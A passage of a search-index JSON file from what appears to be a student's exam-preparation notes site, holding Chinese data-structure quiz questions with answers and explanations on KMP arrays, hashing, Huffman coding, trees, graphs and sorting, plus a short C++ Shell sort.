\u89e3\u6790\uff1a\u5229\u7528\u4e24\u4e2a\u6808S1\u548cS2\u6765\u6a21\u62df\u4e00\u4e2a\u961f\u5217\uff0c\u5f53\u9700\u8981\u5411\u961f\u5217\u4e2d\u63d2\u5165\u4e00\u4e2a\u5143\u7d20\u65f6\uff0c\u7528S1\u6765\u5b58\u653e\u5df2\u7ecf\u8f93\u5165\u7684\u5143\u7d20\uff0c\u5373S1\u6267\u884c\u5165\u6808\u64cd\u4f5c\uff0c\u5f53\u9700\u8981\u51fa\u961f\u65f6\uff0c\u5219\u5bf9S2\u6267\u884c\u51fa\u6808\u64cd\u4f5c\u3002\u7531\u4e8e\u4ece\u6808\u4e2d\u53d6\u51fa\u5143\u7d20\u7684\u987a\u5e8f\u662f\u539f\u987a\u5e8f\u7684\u9006\u5e8f\uff0c\u6240\u4ee5\u5148\u5c06S1\u7684\u6240\u6709\u5143\u7d20\u5168\u90e8\u51fa\u6808\u5e76\u5165\u6808\u5230S2\u4e2d\uff0c\u518d\u5728S2\u4e2d\u8fdb\u884c\u51fa\u6808\u64cd\u4f5c\uff0c\u5c31\u80fd\u5b9e\u73b0\u51fa\u961f\u64cd\u4f5c\uff0c\u800c\u5728\u6267\u884c\u6b64\u64cd\u4f5c\u4e4b\u524d\uff0c\u5148\u5224\u65adS2\u662f\u5426\u4e3a\u7a7a\uff0c\u5426\u5219\u4f1a\u5bfc\u81f4\u987a\u5e8f\u6df7\u4e71\u3002","title":"1.3. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#14-thu","text":"\u6a21\u5f0f\u4e32T= 'abcaabbcabcaabdab' \uff0c T\u7684next\u6570\u7ec4\u503c\u53canextval\u6570\u7ec4\u503c\u4e3a [\u5317\u4eac\u4ea4\u901a\u5927\u5b66925] A.01112231123456712\u548c01100111011001702 B.01112121124567112\u548c01102131011021701 C.01112231123456712\u548c01102131011021701 D.01112121124567112\u548c01100111011001702 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a id 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 char a b c a a b b c a b c a a b d a b maxl 0 0 0 1 1 2 0 0 1 2 3 4 5 6 0 1 2 next 0 1 1 1 2 2 3 1 1 2 3 4 5 6 7 1 2 nextval 0 1 1 0 2 1 3 1 0 1 1 0 2 1 7 0 1 \u5982\u679c next[i] = next[next[i]]\uff0c\u5219 nextval[i] := next[next[i]]\uff0c\u5426\u5219 nextval[i] := next[i]\u3002","title":"1.4. Thu"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#15-fri","text":"\u8bbe\u6709\u4e00\u7ec4\u5173\u952e\u5b57{25,46,73,9,14,92,45,31,20,51},\u7528\u94fe\u5730\u5740\u6cd5\u6784\u9020\u54c8\u5e0c\u8868\uff0c\u54c8\u5e0c\u51fd\u6570\u4e3aH(key)= key MOD 11\uff0c\u5219\u67e5\u627e\u4e0d\u6210\u529f\u65f6\u7684\u5e73\u5747\u67e5\u627e\u957f\u5ea6\u4e3a [\u5317\u4eac\u4ea4\u901a\u5927\u5b66925-2017] A. 11/10 B. 12/11 C. 13/10 D. 10/11 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a10\u4e2a\u6570\u5b57mod 11 \u540e\u7ed3\u679c\u4e3a [3,2,7,9,3,4,1,9,9,7]\uff0c\u67e5\u627e\u5931\u8d25\u65f6 \u5730\u57400 \u6bd4\u8f830\u6b21 \u5730\u57401 \u6bd4\u8f831\u6b21 \u5730\u57402 \u6bd4\u8f831\u6b21 \u5730\u57403 \u6bd4\u8f832\u6b21 \u5730\u57404 \u6bd4\u8f831\u6b21 \u5730\u57405 \u6bd4\u8f830\u6b21 \u5730\u57406 \u6bd4\u8f830\u6b21 \u5730\u57407 \u6bd4\u8f832\u6b21 \u5730\u57408 \u6bd4\u8f830\u6b21 \u5730\u57409 \u6bd4\u8f833\u6b21 \u5730\u574010 \u6bd4\u8f830\u6b21ASL\u5931\u8d25=\uff081+0+1+2+1+0+0+2+0+3+0\uff09/11 =10/11\u3002","title":"1.5. Fri"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#2-week-2","text":"","title":"2. Week 2"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#21-sat","text":"1.\u8bbe\u4e00\u6bb5\u6587\u672c\u4e2d\u5305\u542b\u5b57\u7b26{a, b, c, d, e}\uff0c\u5176\u51fa\u73b0\u6b21\u6570\u76f8\u5e94\u4e3a{3, 2, 5, 1, 1}\u3002\u5219\u7ecf\u8fc7\u54c8\u592b\u66fc\u7f16\u7801\u540e\uff0c\u6587\u672c\u6240\u5360\u603b\u4f4d\u6570\u4e3a [\u6d59\u6c5f\u5927\u5b66878-2017] A.12 B.25 C.26 D.36 \u7b54\u6848 \u7b54\u6848\uff1aB \u6839\u636e\u54c8\u592b\u66fc\u6811\uff0c5\u7f16\u7801\u4e3a1\uff0c3\u7f16\u7801\u4e3a11\uff0c2\u7f16\u7801\u4e3a110\uff0c\u4e24\u4e2a1\u7f16\u7801\u4e3a1110\u548c1111\uff0c\u6700\u540e\u7684\u603b\u4f4d\u6570\u4e3a\uff0c5*1 + 3*2 + 2*3 + 2* 4 = 25\u3002","title":"2.1. Sat"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#22-sun","text":"\u82e5\u6709\u4e00\u4e8c\u53c9\u6811\u7684\u603b\u7ed3\u70b9\u6570\u4e3a98\uff0c\u53ea\u6709\u4e00\u4e2a\u513f\u5b50\u7684\u7ed3\u70b9\u6570\u4e3a48\uff0c\u5219\u8be5\u6811\u7684\u53f6\u7ed3\u70b9\u6570\u662f\u591a\u5c11\uff1f[\u6d59\u6c5f\u5927\u5b66878-2013] A. 25 B. 50 C. \u4e0d\u786e\u5b9a D. \u8fd9\u6837\u7684\u6811\u4e0d\u5b58\u5728 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u603b\u7ed3\u70b9\u4e2a\u6570\u4e3a n0 + n1 + n2\uff0c \u6211\u4eec\u53ef\u4ee5\u5f97\u523098 = n0 + n1 + n2 \u4e14n1 = 48\uff0c\u540c\u65f6n0 = n2 + 1 \u4e24\u4e2a\u5f0f\u5b50\u8054\u7acb\uff0c\u5f97\u5230n0 = 51/2 \u56e0\u4e3a\u7ed3\u70b9\u6570\u4e0d\u53ef\u80fd\u662f\u5c0f\u6570\uff0c\u6240\u4ee5\u4e0d\u5b58\u5728\u8fd9\u6837\u7684\u6811\u3002","title":"2.2. Sun"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#3-week-3","text":"","title":"3. Week 3"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#31-mon","text":"\u5177\u670911\u4e2a\u9876\u70b9\u7684\u8fde\u901a\u65e0\u5411\u56fe\uff0c\u8fb9\u7684\u603b\u6570\u6700\u591a\u4e3a \uff0c\u8fb9\u7684\u603b\u6570\u6700\u5c11\u4e3a [\u4e2d\u5357\u5927\u5b66943-2016-\u586b\u7a7a\u9898\u7b2c8\u9898\u6539\u7f16] A. 10\uff0c55 B. 55\uff0c10 C. 110\uff0c11 D. 11\uff0c110 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u5bf9\u4e8e\u8fde\u901a\u65e0\u5411\u56fe\uff0c\u8fb9\u7684\u603b\u6570\u6700\u591a\u7684\u60c5\u51b5\u662f\u6b64\u56fe\u4e3a\u65e0\u5411\u5b8c\u5168\u56fe\u7684\u65f6\u5019\uff0c\u6b64\u65f6\u5bf9\u4e8en\u4e2a\u9876\u70b9\uff0c\u6709n*(n-1)/2\u6761\u8fb9\uff0c\u6b64\u9898n=11\uff0c\u4e8e\u662f\u8fb9\u6700\u591a\u4e3a11*\uff0811-1\uff09/2=55\u6761\u8fb9\u7684\u603b\u6570\u6700\u5c11\u7684\u60c5\u51b5\u662f\u6b64\u56fe\u4e3a\u6811\u7684\u60c5\u51b5\uff0c\u5bf9\u4e8e\u6811\u6765\u8bf4\uff0cn\u4e2a\u9876\u70b9\u6709n-1\u6761\u8fb9\uff0c\u4e8e\u662f\u6b64\u9898\u4e2d\u6700\u5c1110\u6761\u8fb9\u3002","title":"3.1. Mon"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#32-tue","text":"\u5bf9\u5e7f\u4e49\u8868A=\uff08\uff08a,\uff08b\uff09\uff09\uff0c\uff08c\uff0c\uff08\uff09\uff09\uff0cd\uff09\u6267\u884c\u64cd\u4f5cgettail(gethead(gettail(A)))\u7684\u7ed3\u679c\u662f [\u5b81\u6ce2\u5927\u5b66916-2019] A. \uff08\uff09 B. \uff08\uff08\uff09\uff09 C. d D. \uff08d\uff09 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u8003\u5bdf\u5e7f\u4e49\u8868\u7684\u57fa\u672c\u64cd\u4f5c\u3002 Head\uff08\uff09\u51fd\u6570\uff1a\u53d6\u5e7f\u4e49\u8868\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20 Tail\uff08\uff09\u51fd\u6570\uff1a\u53d6\u5e7f\u4e49\u8868\u4e2d\u9664\u7b2c\u4e00\u4e2a\u5143\u7d20\uff0c\u5269\u4e0b\u7684\u5143\u7d20\u6784\u6210\u7684\u5e7f\u4e49\u8868 \u4e8e\u662f\u6211\u4eec\u5bf9A\u5148\u8fdb\u884c\u4e00\u6b21Tail\u64cd\u4f5c\u5f97\uff08\uff08c\uff0c\uff08\uff09\uff09\uff0cd\uff09 \u518d\u8fdb\u884c\u4e00\u6b21Head\u64cd\u4f5c\u5f97\uff08c\uff0c\uff08\uff09\uff09 \u6700\u540e\u8fdb\u884c\u4e00\u6b21Tail\u64cd\u4f5c\u5f97\uff08\uff08\uff09\uff09","title":"3.2. Tue"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#33-wed","text":"\u5728\u5185\u90e8\u6392\u5e8f\u65f6\uff0c\u82e5\u9009\u62e9\u4e86\u5f52\u5e76\u6392\u5e8f\u800c\u6ca1\u6709\u9009\u62e9\u63d2\u5165\u6392\u5e8f\uff0c\u5219\u53ef\u80fd\u7684\u7406\u7531\u662f [\u54c8\u5c14\u6ee8\u5de5\u7a0b\u5927\u5b66] \u5f52\u5e76\u6392\u5e8f\u7684\u7a0b\u5e8f\u4ee3\u7801\u66f4\u77ed \u5f52\u5e76\u6392\u5e8f\u5360\u7528\u7684\u7a7a\u95f4\u66f4\u5c11 \u5f52\u5e76\u6392\u5e8f\u7684\u8fd0\u884c\u6548\u7387\u66f4\u9ad8 A. \u4ec52 B. \u4ec53 C. \u4ec51\u30012 D. \u4ec51\u30013 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u9009\u62e9\u6392\u5e8f\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u6700\u4f18\u6700\u574f\u548c\u5e73\u5747\u90fd\u4e3aO\uff08n2\uff09 \uff0c\u800c\u5f52\u5e76\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u5219\u90fd\u4e3aO(nlog2n), \u53ef\u89c1\u5f52\u5e76\u7684\u6548\u7387\u9ad8\uff1b \u8d8a\u4f18\u7684\u7b97\u6cd5\u7684\u6b65\u9aa4\u5c31\u4e00\u822c\u4f1a\u8d8a\u590d\u6742\uff0c \u4f8b\u5982\u5192\u6ce1\u548c\u9009\u62e9\u4ee3\u7801\u90fd\u5f88\u7b80\u5355\uff0c \u6240\u4ee5\u5f52\u5e76\u6bd4\u9009\u62e9\u4ee3\u7801\u590d\u6742; \u5f52\u5e76\u662f\u5c5e\u4e8e\u7528\u7a7a\u95f4\u6362\u65f6\u95f4\u7684\u7b97\u6cd5\uff0c\u5728\u5806\u533anew\u51fa\u4e86\u7a7a\u95f4\uff0c\u800c\u9009\u62e9\u6392\u5e8f\u4e0d\u9700\u8981\u521b\u5efa\u7a7a\u95f4\uff0c\u7a7a\u95f4\u590d\u6742\u5ea6\u4e3aO(1)\u3002","title":"3.3. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#34-thu","text":"\u5bf9\u5e8f\u5217{15\uff0c9\uff0c7\uff0c8\uff0c20\uff0c-1\uff0c4\uff0c} \u7528\u5e0c\u5c14\u6392\u5e8f\u65b9\u6cd5\u6392\u5e8f\uff0c\u7ecf\u4e00\u8d9f\u540e\u5e8f\u5217\u53d8\u4e3a{15\uff0c-1\uff0c4\uff0c8\uff0c20\uff0c9\uff0c7}\u5219\u8be5\u6b21\u91c7\u7528\u7684\u589e\u91cf\u662f [\u54c8\u5c14\u6ee8\u5de5\u7a0b\u5927\u5b66] A. 2 B. 1 C. 4 D. 3 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a9\u548c-1\u66ff\u6362\uff0c7\u548c4\u66ff\u6362\uff0c\u589e\u91cf\u4e3a4\u3002 \u5e0c\u5c14\u6392\u5e8f(Shell's Sort)\u662f\u63d2\u5165\u6392\u5e8f\u7684\u4e00\u79cd\u53c8\u79f0\u201c\u7f29\u5c0f\u589e\u91cf\u6392\u5e8f\u201d\uff08Diminishing Increment Sort\uff09\uff0c\u662f\u76f4\u63a5\u63d2\u5165\u6392\u5e8f\u7b97\u6cd5\u7684\u4e00\u79cd\u66f4\u9ad8\u6548\u7684\u6539\u8fdb\u7248\u672c\u3002\u5e0c\u5c14\u6392\u5e8f\u662f\u975e\u7a33\u5b9a\u6392\u5e8f\u7b97\u6cd5\u3002\u8be5\u65b9\u6cd5\u56e0 D.L.Shell \u4e8e 1959 \u5e74\u63d0\u51fa\u800c\u5f97\u540d\u3002 \u5e0c\u5c14\u6392\u5e8f\u662f\u628a\u8bb0\u5f55\u6309\u4e0b\u6807\u7684\u4e00\u5b9a\u589e\u91cf\u5206\u7ec4\uff0c\u5bf9\u6bcf\u7ec4\u4f7f\u7528\u76f4\u63a5\u63d2\u5165\u6392\u5e8f\u7b97\u6cd5\u6392\u5e8f\uff1b\u968f\u7740\u589e\u91cf\u9010\u6e10\u51cf\u5c11\uff0c\u6bcf\u7ec4\u5305\u542b\u7684\u5173\u952e\u8bcd\u8d8a\u6765\u8d8a\u591a\uff0c\u5f53\u589e\u91cf\u51cf\u81f3 1 \u65f6\uff0c\u6574\u4e2a\u6587\u4ef6\u6070\u88ab\u5206\u6210\u4e00\u7ec4\uff0c\u7b97\u6cd5\u4fbf\u7ec8\u6b62\u3002 \u589e\u91cf\u4e00\u822c\u521d\u59cb\u5316\u4e3a\u5e8f\u5217\u957f\u5ea6 D \u7684 1 / 2 \uff0c\u5373 n := D / 2 \u3002\u7136\u540e\u6bd4\u8f83 list[i] \u548c list[i + n] \u7684\u5927\u5c0f\uff0c\u82e5\u4e3a\u5347\u5e8f\u6392\u5e8f\uff0c\u4e14 list[i] < list[i + n] \uff0c\u5219\u4ea4\u6362\u4f4d\u7f6e\u3002\u6bcf\u904d\u5386\u5b8c\u4e00\u8f6e\u4ee5\u540e n := n / 2 \uff0c\u5f53 n = 0 \u65f6\u6392\u5e8f\u7ed3\u675f\u3002 \u7b97\u6cd5\u5e73\u5747\u590d\u6742\u5ea6\u4e3a O(n ^ {\\frac{2}{3}}) \u3002 template <typename _RIter> void insert_sort(_RIter st, _RIter ed, int delta) { for(_RIter i = st + delta; i < ed; i += delta) { for(_RIter j = i; j > st; j -= delta) if(*j < *(j - delta)) std::swap(*j, *(j - delta)); else break; } } template <typename _RIter> void shell_sort(_RIter st, _RIter ed) { for(int delta = ed - st; delta; delta /= 2) for(int i = 0; i < delta; i++) insert_sort(st + i, ed, delta); }","title":"3.4. Thu"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#4-week-4","text":"","title":"4. Week 4"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#41-tue","text":"\u56feG\u662fn\u4e2a\u9876\u70b9\u7684\u65e0\u5411\u5b8c\u5168\u56fe,\u5219\u4e0b\u5217\u8bf4\u6cd5\u4e0d\u6b63\u786e\u7684\u4e3a: [\u4e2d\u56fd\u79d1\u5b66\u9662\u5927\u5b66-2018] A. G\u7684\u90bb\u63a5\u591a\u91cd\u8868\u9700\u8981n(n-1)\u4e2a\u8fb9\u7ed3\u70b9\u548cn\u4e2a\u9876\u70b9\u7ed3\u70b9 B. G\u7684\u8fde\u901a\u5206\u91cf\u4e2a\u6570\u6700\u5c11 C. G\u4e3a\u8fde\u901a\u56fe D. G\u6240\u6709\u9876\u70b9\u7684\u5ea6\u7684\u603b\u548c\u4e3an(n-1) \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u5728\u65e0\u5411\u56fe\u4e2d\uff0c\u5982\u679c\u4ece\u9876\u70b9vi\u5230\u9876\u70b9vj\u6709\u8def\u5f84\uff0c\u5219\u79f0vi\u548cvj\u8fde\u901a\u3002\u5982\u679c\u56fe\u4e2d\u4efb\u610f\u4e24\u4e2a\u9876\u70b9\u4e4b\u95f4\u90fd\u8fde\u901a\uff0c\u5219\u79f0\u8be5\u56fe\u4e3a\u8fde\u901a\u56fe\uff0c\u5426\u5219\uff0c\u79f0\u8be5\u56fe\u4e3a\u975e\u8fde\u901a\u56fe\uff0c\u5219\u5176\u4e2d\u7684\u6781\u5927\u8fde\u901a\u5b50\u56fe\u79f0\u4e3a\u8fde\u901a\u5206\u91cf\uff0c\u8fd9\u91cc\u6240\u8c13\u7684\u6781\u5927\u662f\u6307\u5b50\u56fe\u4e2d\u5305\u542b\u7684\u9876\u70b9\u4e2a\u6570\u6781\u5927\u3002 A. \u8fb9\u7684\u6761\u6570\u4e3aC\uff08n,2\uff09=n(n-1)/2\u3002\u4e0e\u5341\u5b57\u94fe\u8868\u7c7b\u4f3c\uff0c\u5728\u4e34\u8857\u591a\u91cd\u8868\u4e2d\uff0c\u6bcf\u6761\u8fb9\u7528\u4e00\u4e2a\u7ed3\u70b9\u8868\u793a\u3002 B. G\u662f\u5b8c\u5168\u56fe\uff0c\u5fc5\u5b9a\u662f\u8fde\u901a\u56fe\u3002\u6240\u4ee5\u8fde\u901a\u5206\u91cf\u53ea\u6709\u5176\u81ea\u8eab C. G\u662f\u5b8c\u5168\u56fe\uff0c\u5fc5\u5b9a\u662f\u8fde\u901a\u56fe D. \u6bcf\u4e2a\u9876\u70b9\u90fd\u4e0e\u5176\u4f59n-1\u4e2a\u9876\u70b9\u76f8\u8fde\uff0c\u5219n\u4e2a\u9876\u70b9\u5ea6\u7684\u548c\u4e3an(n-1)","title":"4.1. Tue"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/","text":"\u6570\u636e\u7ed3\u6784\u6bcf\u65e5\u4e00\u9898 2020 July # \u76ee\u5f55 # \u6570\u636e\u7ed3\u6784\u6bcf\u65e5\u4e00\u9898 2020 July \u76ee\u5f55 1. Week 3 1.1. Wed 1.2. Thu 1.3. Fri 1.4. Sat 1.5. Sun 2. Week 4 2.1. Mon 2.2. Tue 2.3. Wed 2.4. Thu 2.5. Fri 2.6. Sat 2.7. Sun 1. Week 3 # 1.1. Wed # \u5bf9\u4e00\u7ec4\u6570\u636e(2\uff0c12\uff0c16\uff0c88\uff0c5\uff0c10)\u8fdb\u884c\u6392\u5e8f\uff0c\u82e5\u524d\u4e09\u8d9f\u6392\u5e8f\u7ed3\u679c\u5982\u4e0b \u7b2c\u4e00\u8d9f\uff1a2\uff0c12\uff0c16\uff0c5\uff0c10\uff0c88 \u7b2c\u4e8c\u8d9f\uff1a2\uff0c12\uff0c5\uff0c10\uff0c16\uff0c88 \u7b2c\u4e09\u8d9f\uff1a2\uff0c5\uff0c10\uff0c12\uff0c16\uff0c88 \u5219\u91c7\u7528\u7684\u6392\u5e8f\u65b9\u6cd5\u53ef\u80fd\u662f [\u54c8\u5c14\u6ee8\u5de5\u4e1a\u5927\u5b66] A\uff0e\u8d77\u6ce1\u6392\u5e8f B\uff0e\u5e0c\u5c14\u6392\u5e8f C\uff0e\u5f52\u5e76\u6392\u5e8f D\uff0e\u57fa\u6570\u6392\u5e8f \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u8003\u67e5\u5404\u6392\u5e8f\u7b97\u6cd5\u7684\u7279\u70b9\uff1b \u7b2c\u4e00\u8d9f\uff1a2\uff0c12\uff0c16\uff0c5\uff0c10\uff0c88\uff0c\u662f88\u5230\u4e86\u5e8f\u5217\u7684\u672b\u5c3e\uff1b \u7b2c\u4e8c\u8d9f\uff1a2\uff0c12\uff0c5\uff0c10\uff0c16\uff0c88\uff0c\u662f16\u5230\u4e86\u5e8f\u5217\u7684\u5012\u6570\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\uff1b \u7b2c\u4e09\u8d9f\uff1a2\uff0c5\uff0c10\uff0c12\uff0c16\uff0c88\uff0c\u662f12\u5230\u4e86\u5e8f\u5217\u7684\u5012\u6570\u7b2c\u4e09\u4e2a\u4f4d\u7f6e\uff1b \u6839\u636e\u8fd9\u4e09\u8d9f\u6392\u5e8f\u65f6\uff0c\u5747\u662f\u5927\u6570\u6392\u5230\u672b\u5c3e\u7684\u7279\u70b9\u53ef\u4ee5\u77e5\u9053\uff0c\u672c\u9898\u76ee\u4e2d\u53ef\u80fd\u91c7\u7528\u4e86\u8d77\u6ce1\u6392\u5e8f\u3002 1.2. Thu # \u8bbe\u4e00\u68f5\u975e\u7a7a\u5b8c\u5168\u4e8c\u53c9\u6811T\u7684\u6240\u6709\u53f6\u7ed3\u70b9\u5747\u4f4d\u4e8e\u540c\u4e00\u5c42\uff0c\u4e14\u6bcf\u4e2a\u975e\u53f6\u7ed3\u70b9\u90fd\u67092\u4e2a\u5b50\u7ed3\u70b9\u3002\u82e5T\u6709k\u4e2a\u53f6\u7ed3\u70b9\uff0c\u5219T\u7684\u7ed3\u70b9\u603b\u6570\u662f [\u54c8\u5c14\u6ee8\u5de5\u4e1a\u5927\u5b66] A.2k-1 B.2k C.k^2 D.2^k-1 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u9996\u5148\uff0c\u4e00\u68f5\u975e\u7a7a\u5b8c\u5168\u4e8c\u53c9\u6811T\u7684\u6240\u6709\u53f6\u7ed3\u70b9\u5747\u4f4d\u4e8e\u540c\u4e00\u5c42\uff0c\u4e14\u6bcf\u4e2a\u975e\u53f6\u7ed3\u70b9\u90fd\u67092\u4e2a\u5b50\u7ed3\u70b9\u5c31\u662f\u6ee1\u4e8c\u53c9\u6811\u3002\u4e8e\u662f\u6211\u4eec\u8bbe\u6811\u9ad8\u4e3ah\uff0c\u6709 k = 2^(h-1)\uff0ch=log2k+1,\u603b\u7ed3\u70b9\u6570\u4e3a2^h-1 = 2^(log2k+1)-1 = 2*2^(log2k)-1 = 2k-1\u3002 1.3. Fri # \u4e0b\u5217\u9009\u9879\u4e2d\uff0c\u4e0d\u80fd\u6784\u6210\u6298\u534a\u67e5\u627e\u4e2d\u5173\u952e\u5b57\u6bd4\u8f83\u5e8f\u5217\u7684\u662f \u3002[\u54c8\u5c14\u6ee8\u5de5\u4e1a\u5927\u5b66] A. 500,200,450,180 B. 500,450,200,180 C. 180,500,200,450 D. 180,200,500,450 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u6298\u534a\u67e5\u627e\u7684\u5224\u5b9a\u6811\u662f\u4e00\u68f5\u4e8c\u53c9\u6392\u5e8f\u6811\uff0c\u56db\u4e2a\u9009\u9879\u4e2d\uff0c\u53ea\u6709A\u9009\u9879\u7684\u5bf9\u5e94\u5224\u5b9a\u6811\u4e0d\u6ee1\u8db3\u4e8c\u53c9\u6392\u5e8f\u6811\u7684\u7279\u70b9\u3002\u5982\u56fe\uff0c180\u4e0d\u6ee1\u8db3\u5c0f\u4e8e200\u3002 1.4. Sat # \u73b0\u6709\u4e00\u68f5\u65e0\u91cd\u590d\u5173\u952e\u5b57\u7684\u5e73\u8861\u4e8c\u53c9\u6811\uff08AVL \u6811\uff09,\u5bf9\u5176\u8fdb\u884c\u4e2d\u5e8f\u904d\u5386\u53ef\u5f97\u5230\u4e00\u4e2a\u964d\u5e8f\u5e8f\u5217\u3002\u4e0b\u5217\u5173\u4e8e\u8be5\u5e73\u8861\u4e8c\u53c9\u6811\u7684\u53d9\u8ff0\u4e2d\uff0c\u6b63\u786e\u7684\u662f [\u54c8\u5c14\u6ee8\u5de5\u4e1a\u5927\u5b66] A. \u6839\u7ed3\u70b9\u7684\u5ea6\u4e00\u5b9a\u4e3a2 B. \u6811\u4e2d\u6700\u5c0f\u5143\u7d20\u4e00\u5b9a\u662f\u53f6\u7ed3\u70b9 C. \u6700\u540e\u63d2\u5165\u7684\u5143\u7d20\u4e00\u5b9a\u662f\u53f6\u7ed3\u70b9 D. \u6811\u4e2d\u6700\u5927\u5143\u7d20\u4e00\u5b9a\u662f\u65e0\u5de6\u5b50\u6811 \u6ce8\uff1a\u524d\u5e8f\u904d\u5386-\u6839\u5de6\u53f3\uff0c\u4e2d\u5e8f\u904d\u5386-\u5de6\u6839\u53f3\uff0c\u540e\u5e8f\u904d\u5386-\u5de6\u53f3\u6839 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a A. \u53ea\u6709\u4e00\u4e2a\u6839\u8282\u70b9\u4e5f\u53ef\u4ee5\u79f0\u4e4b\u4e3a\u5e73\u8861\u4e8c\u53c9\u6811\uff0c\u6b64\u65f6\u5ea6\u4e0d\u4e3a2 B. \u4e2d\u5e8f\u904d\u5386\uff1aLPR\u3002\u5f53\u6ca1\u6709R\u7684\u65f6\u5019\uff0c\u6700\u5c0f\u5143\u7d20\u662fP\uff0c\u5b83\u4e0d\u662f\u53f6\u5b50\u7ed3\u70b9 C. \u56e0\u4e3a\u8981\u8fdb\u884c\u5e73\u8861\u8c03\u6574\uff0c\u6240\u4ee5\u4e0d\u4e00\u5b9a\u3002LR\u65cb\u8f6c\u548cRL\u65cb\u8f6c\uff0c\u6700\u540e\u63d2\u5165\u7684\u7ed3\u70b9\u90fd\u53ef\u80fd\u6210\u4e3a\u6839\u8282\u70b9 D. \u4e2d\u5e8f\u904d\u5386\uff1aLPR\u3002\u5982\u679c\u6709\u5de6\u5b50\u6811\uff0c\u5219P\u6bd4\u5de6\u5b50\u6811\u66f4\u5c0f\uff0c\u4e0d\u4f1a\u662f\u6700\u5927\u5143\u7d20 1.5. Sun # \u8981\u4f7f\u4e00\u68f5\u975e\u7a7a\u4e8c\u53c9\u6811\u7684\u5148\u5e8f\u5e8f\u5217\u4e0e\u4e2d\u5e8f\u5e8f\u5217\u76f8\u540c\uff0c\u5176\u6240\u6709\u975e\u53f6\u7ed3\u70b9\u987b\u6ee1\u8db3\u7684\u6761\u4ef6\u662f [\u54c8\u5c14\u6ee8\u5de5\u4e1a\u5927\u5b66] A. \u53ea\u6709\u5de6\u5b50\u6811 B. \u53ea\u6709\u53f3\u5b50\u6811 C. \u7ed3\u70b9\u7684\u5ea6\u5747\u4e3a1 D. \u7ed3\u70b9\u7684\u5ea6\u5747\u4e3a2 \u7b54\u6848 \u7b54\u6848\uff1aB 